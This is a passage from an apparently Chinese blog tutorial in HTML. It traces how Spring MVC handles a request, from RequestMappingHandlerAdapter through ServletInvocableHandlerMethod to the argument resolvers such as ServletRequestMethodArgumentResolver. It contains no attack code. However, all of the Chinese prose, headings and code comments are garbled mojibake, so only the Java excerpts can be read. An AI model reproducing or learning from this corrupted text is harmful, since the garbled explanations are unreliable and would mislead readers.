class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RequestMappingHandlerAdapter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractHandlerMethodAdapter</span><br><span class="hljs-keyword">implements</span> <span class="hljs-title class_">BeanFactoryAware</span>, InitializingBean &#123;<br><br>    ...<br>    <br>    <span class="hljs-comment">//AbstractHandlerMethodAdapterç±»çš„æ–¹æ³•ï¼ŒRequestMappingHandlerAdapterç»§æ‰¿AbstractHandlerMethodAdapter</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> ModelAndView <span class="hljs-title function_">handle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span><br>        <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-keyword">return</span> handleInternal(request, response, (HandlerMethod) handler);<br>    &#125;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">protected</span> ModelAndView <span class="hljs-title function_">handleInternal</span><span class="hljs-params">(HttpServletRequest request,</span><br><span class="hljs-params">HttpServletResponse response, HandlerMethod handlerMethod)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    ModelAndView mav;<br>        <span class="hljs-comment">//handleInternalçš„æ ¸å¿ƒ</span><br>        mav = invokeHandlerMethod(request, response, handlerMethod);<span class="hljs-comment">//è§£é‡Šçœ‹ä¸‹èŠ‚</span><br><span class="hljs-comment">//...</span><br><span class="hljs-keyword">return</span> mav;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>RequestMappingHandlerAdapter</code>çš„<code>invokeHandlerMethod()</code>æ–¹æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RequestMappingHandlerAdapter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractHandlerMethodAdapter</span><br><span class="hljs-keyword">implements</span> <span class="hljs-title class_">BeanFactoryAware</span>, InitializingBean &#123;<br>    <br><span class="hljs-keyword">protected</span> ModelAndView <span class="hljs-title function_">invokeHandlerMethod</span><span class="hljs-params">(HttpServletRequest request,</span><br><span class="hljs-params">HttpServletResponse response, HandlerMethod handlerMethod)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br><span class="hljs-type">ServletWebRequest</span> <span class="hljs-variable">webRequest</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletWebRequest</span>(request, response);<br><span class="hljs-keyword">try</span> &#123;<br>...<br>            <br>            <span class="hljs-type">ServletInvocableHandlerMethod</span> <span class="hljs-variable">invocableMethod</span> <span class="hljs-operator">=</span> createInvocableHandlerMethod(handlerMethod);<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.argumentResolvers != <span class="hljs-literal">null</span>) &#123;<br>invocableMethod.setHandlerMethodArgumentResolvers(<span class="hljs-built_in">this</span>.argumentResolvers);<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.returnValueHandlers != <span class="hljs-literal">null</span>) &#123;<br>invocableMethod.setHandlerMethodReturnValueHandlers(<span class="hljs-built_in">this</span>.returnValueHandlers);<br>&#125;<br>...<br><br>            <span class="hljs-comment">//å…³æ³¨ç‚¹ï¼šæ‰§è¡Œç›®æ ‡æ–¹æ³•</span><br>invocableMethod.invokeAndHandle(webRequest, mavContainer);<br><span class="hljs-keyword">if</span> (asyncManager.isConcurrentHandlingStarted()) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br><br><span class="hljs-keyword">return</span> getModelAndView(mavContainer, modelFactory, webRequest);<br>&#125;<br><span class="hljs-keyword">finally</span> &#123;<br>webRequest.requestCompleted();<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>invokeAndHandle()</code>æ–¹æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ServletInvocableHandlerMethod</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">InvocableHandlerMethod</span> &#123;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invokeAndHandle</span><span class="hljs-params">(ServletWebRequest webRequest, ModelAndViewContainer mavContainer,</span><br><span class="hljs-params">Object... providedArgs)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br><span class="hljs-type">Object</span> <span class="hljs-variable">returnValue</span> <span class="hljs-operator">=</span> invokeForRequest(webRequest, mavContainer, providedArgs);<br><br>        ...<br>        <br><span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//returnValueå­˜å‚¨èµ·æ¥</span><br><span class="hljs-built_in">this</span>.returnValueHandlers.handleReturnValue(<br>returnValue, getReturnValueType(returnValue), mavContainer, webRequest);<br>&#125;<br><span class="hljs-keyword">catch</span> (Exception ex) &#123;<br>...<br>&#125;<br>&#125;<br>    <br>    <span class="hljs-meta">@Nullable</span><span class="hljs-comment">//InvocableHandlerMethodç±»çš„ï¼ŒServletInvocableHandlerMethodç±»ç»§æ‰¿InvocableHandlerMethodç±»</span><br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invokeForRequest</span><span class="hljs-params">(NativeWebRequest request, <span class="hljs-meta">@Nullable</span> ModelAndViewContainer mavContainer,</span><br><span class="hljs-params">Object... providedArgs)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-comment">////è·å–æ–¹æ³•çš„å‚æ•°å€¼</span><br>Object[] args = getMethodArgumentValues(request, mavContainer, providedArgs);<br><br>        ...<br>       <br><span class="hljs-keyword">return</span> doInvoke(args);<br>&#125;<br><br>    <span class="hljs-meta">@Nullable</span><br><span class="hljs-keyword">protected</span> Object <span class="hljs-title function_">doInvoke</span><span class="hljs-params">(Object... args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> getBridgedMethod();<span class="hljs-comment">//@RequestMappingçš„æ–¹æ³•</span><br>ReflectionUtils.makeAccessible(method);<br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-keyword">if</span> (KotlinDetector.isSuspendingFunction(method)) &#123;<br><span class="hljs-keyword">return</span> CoroutinesUtils.invokeSuspendingFunction(method, getBean(), args);<br>&#125;<br>            <span class="hljs-comment">//é€šè¿‡åå°„è°ƒç”¨</span><br><span class="hljs-keyword">return</span> method.invoke(getBean(), args);<span class="hljs-comment">//getBean()æŒ‡@RequestMappingçš„æ–¹æ³•æ‰€åœ¨ç±»çš„å¯¹è±¡ã€‚</span><br>&#125;<br><span class="hljs-keyword">catch</span> (IllegalArgumentException ex) &#123;<br>...<br>&#125;<br><span class="hljs-keyword">catch</span> (InvocationTargetException ex) &#123;<br>...<br>&#125;<br>&#125;<br>    <br>&#125;   <br></code></pre></td></tr></table></figure><h3 id="å¦‚ä½•ç¡®å®šç›®æ ‡æ–¹æ³•æ¯ä¸€ä¸ªå‚æ•°çš„å€¼"><a href="#å¦‚ä½•ç¡®å®šç›®æ ‡æ–¹æ³•æ¯ä¸€ä¸ªå‚æ•°çš„å€¼" class="headerlink" title="å¦‚ä½•ç¡®å®šç›®æ ‡æ–¹æ³•æ¯ä¸€ä¸ªå‚æ•°çš„å€¼"></a>å¦‚ä½•ç¡®å®šç›®æ ‡æ–¹æ³•æ¯ä¸€ä¸ªå‚æ•°çš„å€¼</h3><p>é‡ç‚¹åˆ†æ<code>ServletInvocableHandlerMethod</code>çš„<code>getMethodArgumentValues</code>æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ServletInvocableHandlerMethod</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">InvocableHandlerMethod</span> &#123;<br>    ...<br><br><span class="hljs-meta">@Nullable</span><span class="hljs-comment">//InvocableHandlerMethodç±»çš„ï¼ŒServletInvocableHandlerMethodç±»ç»§æ‰¿InvocableHandlerMethodç±»</span><br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invokeForRequest</span><span class="hljs-params">(NativeWebRequest request, <span class="hljs-meta">@Nullable</span> ModelAndViewContainer mavContainer,</span><br><span class="hljs-params">Object... providedArgs)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-comment">////è·å–æ–¹æ³•çš„å‚æ•°å€¼</span><br>Object[] args = getMethodArgumentValues(request, mavContainer, providedArgs);<br><br>        ...<br>       <br><span class="hljs-keyword">return</span> doInvoke(args);<br>&#125;<br> <br>    <span class="hljs-comment">//æœ¬èŠ‚é‡ç‚¹ï¼Œè·å–æ–¹æ³•çš„å‚æ•°å€¼</span><br><span class="hljs-keyword">protected</span> Object[] getMethodArgumentValues(NativeWebRequest request, <span class="hljs-meta">@Nullable</span> ModelAndViewContainer mavContainer,<br>Object... providedArgs) <span class="hljs-keyword">throws</span> Exception &#123;<br><br>MethodParameter[] parameters = getMethodParameters();<br><span class="hljs-keyword">if</span> (ObjectUtils.isEmpty(parameters)) &#123;<br><span class="hljs-keyword">return</span> EMPTY_ARGS;<br>&#125;<br><br>Object[] args = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[parameters.length];<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; parameters.length; i++) &#123;<br><span class="hljs-type">MethodParameter</span> <span class="hljs-variable">parameter</span> <span class="hljs-operator">=</span> parameters[i];<br>parameter.initParameterNameDiscovery(<span class="hljs-built_in">this</span>.parameterNameDiscoverer);<br>args[i] = findProvidedArgument(parameter, providedArgs);<br><span class="hljs-keyword">if</span> (args[i] != <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">continue</span>;<br>&#125;<br>            <span class="hljs-comment">//æŸ¥çœ‹resolversæ˜¯å¦æœ‰æ”¯æŒ</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.resolvers.supportsParameter(parameter)) &#123;<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(formatArgumentError(parameter, <span class="hljs-string">&quot;No suitable resolver&quot;</span>));<br>&#125;<br><span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-comment">//æ”¯æŒçš„è¯å°±å¼€å§‹è§£æå§</span><br>args[i] = <span class="hljs-built_in">this</span>.resolvers.resolveArgument(parameter, mavContainer, request, <span class="hljs-built_in">this</span>.dataBinderFactory);<br>&#125;<br><span class="hljs-keyword">catch</span> (Exception ex) &#123;<br>....<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> args;<br>&#125;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><p><code>this.resolvers</code>çš„ç±»å‹ä¸º<code>HandlerMethodArgumentResolverComposite</code>ï¼ˆåœ¨<a href="#">å‚æ•°è§£æå™¨</a>ç« èŠ‚æåŠï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HandlerMethodArgumentResolverComposite</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerMethodArgumentResolver</span> &#123;<br>    <br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">supportsParameter</span><span class="hljs-params">(MethodParameter parameter)</span> &#123;<br><span class="hljs-keyword">return</span> getArgumentResolver(parameter) != <span class="hljs-literal">null</span>;<br>&#125;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-meta">@Nullable</span><br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">resolveArgument</span><span class="hljs-params">(MethodParameter parameter, <span class="hljs-meta">@Nullable</span> ModelAndViewContainer mavContainer,</span><br><span class="hljs-params">NativeWebRequest webRequest, <span class="hljs-meta">@Nullable</span> WebDataBinderFactory binderFactory)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br><span class="hljs-type">HandlerMethodArgumentResolver</span> <span class="hljs-variable">resolver</span> <span class="hljs-operator">=</span> getArgumentResolver(parameter);<br><span class="hljs-keyword">if</span> (resolver == <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;Unsupported parameter type [&quot;</span> +<br>parameter.getParameterType().getName() + <span class="hljs-string">&quot;]. supportsParameter should be called first.&quot;</span>);<br>&#125;<br><span class="hljs-keyword">return</span> resolver.resolveArgument(parameter, mavContainer, webRequest, binderFactory);<br>&#125;<br>    <br>    <br>    <span class="hljs-meta">@Nullable</span><br><span class="hljs-keyword">private</span> HandlerMethodArgumentResolver <span class="hljs-title function_">getArgumentResolver</span><span class="hljs-params">(MethodParameter parameter)</span> &#123;<br><span class="hljs-type">HandlerMethodArgumentResolver</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.argumentResolverCache.get(parameter);<br><span class="hljs-keyword">if</span> (result == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-comment">//æŒ¨ä¸ªåˆ¤æ–­æ‰€æœ‰å‚æ•°è§£æå™¨é‚£ä¸ªæ”¯æŒè§£æè¿™ä¸ªå‚æ•°</span><br><span class="hljs-keyword">for</span> (HandlerMethodArgumentResolver resolver : <span class="hljs-built_in">this</span>.argumentResolvers) &#123;<br><span class="hljs-keyword">if</span> (resolver.supportsParameter(parameter)) &#123;<br>result = resolver;<br><span class="hljs-built_in">this</span>.argumentResolverCache.put(parameter, result);<span class="hljs-comment">//æ‰¾åˆ°äº†ï¼Œresolverå°±ç¼“å­˜èµ·æ¥ï¼Œæ–¹ä¾¿ç¨åresolveArgument()æ–¹æ³•ä½¿ç”¨</span><br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> result;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h3><p>æœ¬èŠ‚æè¿°ï¼Œä¸€ä¸ªè¯·æ±‚å‘é€åˆ°DispatcherServletåçš„å…·ä½“å¤„ç†æµç¨‹ï¼Œä¹Ÿå°±æ˜¯SpringMVCçš„ä¸»è¦åŸç†ã€‚</p><p>æœ¬èŠ‚å†…å®¹è¾ƒå¤šä¸”ç¡¬æ ¸ï¼Œå¯¹æ—¥åç¼–ç¨‹å¾ˆæœ‰å¸®åŠ©ï¼Œéœ€è€å¿ƒå¯¹å¾…ã€‚</p><p>å¯ä»¥è¿è¡Œä¸€ä¸ªç¤ºä¾‹ï¼Œæ‰“æ–­ç‚¹ï¼Œåœ¨Debugæ¨¡å¼ä¸‹ï¼ŒæŸ¥çœ‹ç¨‹åºæµç¨‹ã€‚</p><h2 id="33ã€è¯·æ±‚å¤„ç†-ã€æºç åˆ†æã€‘-Servlet-APIå‚æ•°è§£æåŸç†"><a href="#33ã€è¯·æ±‚å¤„ç†-ã€æºç åˆ†æã€‘-Servlet-APIå‚æ•°è§£æåŸç†" class="headerlink" title="33ã€è¯·æ±‚å¤„ç†-ã€æºç åˆ†æã€‘-Servlet APIå‚æ•°è§£æåŸç†"></a>33ã€è¯·æ±‚å¤„ç†-ã€æºç åˆ†æã€‘-Servlet APIå‚æ•°è§£æåŸç†</h2><ul><li>WebRequest</li><li>ServletRequest</li><li>MultipartRequest</li><li>HttpSession</li><li>javax.servlet.http.PushBuilder</li><li>Principal</li><li>InputStream</li><li>Reader</li><li>HttpMethod</li><li>Locale</li><li>TimeZone</li><li>ZoneId</li></ul><p><strong>ServletRequestMethodArgumentResolver</strong>ç”¨æ¥å¤„ç†ä»¥ä¸Šçš„å‚æ•°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ServletRequestMethodArgumentResolver</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerMethodArgumentResolver</span> &#123;<br><br><span class="hljs-meta">@Nullable</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Class&lt;?&gt; pushBuilder;<br><br><span class="hljs-keyword">static</span> &#123;<br><span class="hljs-keyword">try</span> &#123;<br>pushBuilder = ClassUtils.forName(<span class="hljs-string">&quot;javax.servlet.http.PushBuilder&quot;</span>,<br>ServletRequestMethodArgumentResolver.class.getClassLoader());<br>&#125;<br><span class="hljs-keyword">catch</span> (ClassNotFoundException ex) &#123;<br><span class="hljs-comment">// Servlet 4.0 PushBuilder not found - not supported for injection</span><br>pushBuilder = <span class="hljs-literal">null</span>;<br>&#125;<br>&#125;<br><br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">supportsParameter</span><span class="hljs-params">(MethodParameter parameter)</span> &#123;<br>Class&lt;?&gt; paramType = parameter.getParameterType();<br><span class="hljs-keyword">return</span> (WebRequest.class.isAssignableFrom(paramType) ||<br>ServletRequest.class.isAssignableFrom(paramType) ||<br>MultipartRequest.class.isAssignableFrom(paramType) ||<br>HttpSession.class.isAssignableFrom(paramType) ||<br>(pushBuilder != <span class="hljs-literal">null</span> &amp;&amp; pushBuilder.isAssignableFrom(paramType)) ||<br>(Principal.class.isAssignableFrom(paramType) &amp;&amp; !parameter.hasParameterAnnotations()) ||<br>InputStream.class.isAssignableFrom(paramType) ||<br>Reader.class.isAssignableFrom(paramType) ||<br>HttpMethod.class == paramType ||<br>Locale.class == paramType ||<br>TimeZone.class == paramType ||<br>ZoneId.class == paramType);<br>&#125;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">resolveArgument</span><span class="hljs-params">(MethodParameter parameter, <span class="hljs-meta">@Nullable</span> ModelAndViewContainer mavContainer,</span><br><span class="hljs-params">NativeWebRequest webRequest, <span class="hljs-meta">@Nullable</span> WebDataBinderFactory binderFactory)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>Class&lt;?&gt; paramType = parameter.getParameterType();<br><br><span class="hljs-comment">// WebRequest / NativeWebRequest / ServletWebRequest</span><br><span class="hljs-keyword">if</span> (WebRequest.class.isAssignableFrom(paramType)) &#123;<br><span class="hljs-keyword">if</span> (!paramType.isInstance(webRequest)) &#123;<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(<br><span class="hljs-string">&quot;Current request is not of type [&quot;</span> + paramType.getName() + <span class="hljs-string">&quot;]: &quot;</span> + webRequest);<br>&#125;<br><span class="hljs-keyword">return</span> webRequest;<br>&#125;<br><br><span class="hljs-comment">// ServletRequest / HttpServletRequest / MultipartRequest / MultipartHttpServletRequest</span><br><span class="hljs-keyword">if</span> (ServletRequest.class.isAssignableFrom(paramType) || MultipartRequest.class.isAssignableFrom(paramType)) &#123;<br><span class="hljs-keyword">return</span> resolveNativeRequest(webRequest, paramType);<br>&#125;<br><br><span class="hljs-comment">// HttpServletRequest required for all further argument types</span><br><span class="hljs-keyword">return</span> resolveArgument(paramType, resolveNativeRequest(webRequest, HttpServletRequest.class));<br>&#125;<br><br><span class="hljs-keyword">private</span> &lt;T&gt; T <span class="hljs-title function_">resolveNativeRequest</span><span class="hljs-params">(NativeWebRequest webRequest, Class&lt;T&gt; requiredType)</span> &#123;<br><span class="hljs-type">T</span> <span class="hljs-variable">nativeRequest</span> <span class="hljs-operator">=</span> webRequest.getNativeRequest(requiredType);<br><span class="hljs-keyword">if</span> (nativeRequest == <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(<br><span class="hljs-string">&quot;Current request is not of type [&quot;</span> + requiredType.getName() + <span class="hljs-string">&quot;]: &quot;</span> + webRequest);<br>&#125;<br><span class="hljs-keyword">return</span> nativeRequest;<br>&#125;<br><br><span class="hljs-meta">@Nullable</span><br><span class="hljs-keyword">private</span> Object <span class="hljs-title function_">resolveArgument</span><span class="hljs-params">(Class&lt;?&gt; paramType, HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br><span class="hljs-keyword">if</span> (HttpSession.class.isAssignableFrom(paramType)) &#123;<br><span class="hljs-type">HttpSession</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> request.getSession();<br><span class="hljs-keyword">if</span> (session != <span class="hljs-literal">null</span> &amp;&amp; !paramType.isInstance(session)) &#123;<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(<br><span class="hljs-string">&quot;Current session is not of type [&quot;</span> + paramType.getName() + <span class="hljs-string">&quot;]: &quot;</span> + session);<br>&#125;<br><span class="hljs-keyword">return</span> session;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pushBuilder != <span class="hljs-literal">null</span> &amp;&amp; pushBuilder.isAssignableFrom(paramType)) &#123;<br><span class="hljs-keyword">return</span> PushBuilderDelegate.resolvePushBuilder(request, paramType);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (InputStream.class.isAssignableFrom(paramType)) &#123;<br><span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> request.getInputStream();<br><span class="hljs-keyword">if</span> (inputStream != <span class="hljs-literal">null</span> &amp;&amp; !paramType.isInstance(inputStream)) &#123;<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(<br><span class="hljs-string">&quot;Request input stream is not of type [&quot;</span> + paramType.getName() + <span class="hljs-string">&quot;]: &quot;</span> + inputStream);<br>&#125;<br><span class="hljs-keyword">return</span> inputStream;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (Reader.class.isAssignableFrom(paramType)) &#123;<br><span class="hljs-type">Reader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> request.getReader();<br><span class="hljs-keyword">if</span> (reader != <span class="hljs-literal">null</span> &amp;&amp; 